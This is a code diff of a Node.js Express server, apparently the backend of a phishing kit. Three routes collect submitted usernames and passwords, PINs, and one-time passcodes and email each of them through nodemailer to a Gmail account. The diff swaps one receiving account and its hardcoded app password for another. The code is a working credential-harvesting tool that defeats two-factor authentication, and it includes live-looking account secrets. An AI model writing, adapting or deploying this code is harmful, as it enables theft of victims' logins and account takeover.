@@ -21,14 +21,14 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "Eberechukwu239@gmail.com",
-      pass: "emaewtxhoaebdhgb",
+      user: "painkiller43211@gmail.com",
+      pass: "oiljwnrviygkfdbr",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Eberechukwu239@gmail.com",
+    to: "painkiller43211@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -51,14 +51,14 @@ app.post("/pin", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "Eberechukwu239@gmail.com",
-      pass: "emaewtxhoaebdhgb",
+      user: "painkiller43211@gmail.com",
+      pass: "oiljwnrviygkfdbr",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Eberechukwu239@gmail.com",
+    to: "painkiller43211@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -81,14 +81,14 @@ app.post("/otp", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "Eberechukwu239@gmail.com",
-      pass: "emaewtxhoaebdhgb",
+      user: "painkiller43211@gmail.com",
+      pass: "oiljwnrviygkfdbr",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Eberechukwu239@gmail.com",
+    to: "painkiller43211@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
